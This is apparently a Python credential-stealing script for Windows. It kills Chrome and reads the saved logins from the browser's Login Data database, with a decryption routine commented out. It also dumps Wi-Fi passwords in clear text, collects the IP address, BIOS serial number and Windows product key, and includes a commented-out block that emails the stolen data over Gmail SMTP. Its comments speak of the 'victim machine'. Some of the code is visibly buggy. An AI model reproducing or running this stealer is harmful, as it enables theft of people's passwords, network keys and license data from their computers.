import sys
##import win32api
##pywin32 allows us to manipulate COM(component object model) which means we can use almost all of windows applications through a program.
##pywin32 is a thin wrapper that lets us do almost anything we wanted to do with a windows application.
##pip install pywin32
##win32crypt comes standard with pywin32 to decrypt the standard encryption of windows applications.


import win32crypt

"Importing the standard operating system module. Since our program relies heavily on operating system manipulations"
import os
#In order to communicate with others we had to use a library for Simple Mail Transfer Protocol. The module smptlib will allow us to establish
##a connection to send our files 
import smtplib
import subprocess
"Using sql since it is the standard mode of database storage in windows applications and windows operating system"
import sqlite3

"""The command is a direct command to operating system to first of all close the Chrome process.
Chrome Process needs to be terminated before the information confidentiality is to be captured"""

cmd = 'taskkill /F /IM chrome.exe'
os.system(cmd)

##os.path.expanduser('~') means to show the username of the person using the computer
path = os.path.expanduser('~')+r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'

##Login Data is a file with extension .file in Users\Username\AppData\Local\Google\Chrome\User Data\Default\Login Data
##it contains the saved passwords on chrome but only some are visible as some websites invest heavily on encryption.

##c is an object which is created to establish a connection with the local database inside our victim machine.
c = sqlite3.connect(path)
##

#cursor() is a class in python which helps us to execute our POSTGRE or SQL code.They are used indirectly
##to execute our SQL statements.
cursor = c.cursor()

##variable select statement.
##If we open the Login Data file, we see that there are columns like origin_url,username_value, password_value in the table logins.

##One thing to remember is that the Login Data file can only be decrypted if we are in the same machine where it is created
##If you are thinking that we can copy this file and decrypt it on some else machine then that is not possible.
##The Login Data is encrypted with a Master Key which is created by the help of your password. So simply put, you have to be inside the machine to
##decrypt this file. There is no point in stealing this file. It has to be decrypted inside of the victim machine

select_statement = "SELECT origin_url, username_value, password_value FROM logins"
cursor.execute(select_statement)

login_data = cursor.fetchall()


#we have created an empty dictionary
credentials = {}
#we have created an initial empty string which we will use later to fill dataw with.
string = ''

###traversing the variable url,user_name,pwd in the login_data.login_data is on line 39. The purpose of this variable was
##to fetch all the information we had executed earlier.

##for url, user_name,pwd in login_data:
    #decrypting the data by using win32crypt. The python 
    ##pwd = win32crypt.CryptUnprotectData(pwd)
    ##credentials[url] = (user_name,pwd.decode('utf-8'))
    
    ##appending the string.
    ##string = string + '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' %(url,user_name,pwd.decode('utf-8'))


##print(string)
try:
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            print ("{:<30}|  {:<}".format(i, results[0]))
            j = "{:<30}|  {:<}".format(i, results[0])
        except IndexError:
            print ("{:<30}|  {:<}".format(i, ""))
except:
    print("Cannot execute more.")
##



data = subprocess.check_output(['ipconfig']).decode('utf-8').split('/n')
data2 = subprocess.check_output(['WMIC', 'BIOS', 'GET' ,'SERIALNUMBER']).decode('utf-8').split('/n')
for i in data2:
    i.split("\r")[1][1:-1]
    data2 = i
print(data2)

##This line generates windows serial number
data3 = subprocess.check_output(['WMIC', 'path', 'softwarelicensingservice' ,'get','OA3xOriginalProductKey']).decode('utf-8').split('/n')
for k in data3:
    k.split("\r")[1][1:-1]
    data3 = k
print(data3)



    

for b in data :
    if "IPv4 Address" in b:
        b.split(":")[1][1:-1]
        

file = open('text.txt','w')
file.write(b)
file.close()

##server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
##server.login("exampl@gmail.com","iawue4yt873")
##server.sendmail(
##  "exampl@gmail.com", 
##  "exampl@gmail.com", 
##  b + "\n\n\n" + data2 + '\n\n\n\n' + data3 + '\n\n\n\n' + string + '\n\n\n' + j )
##server.quit()

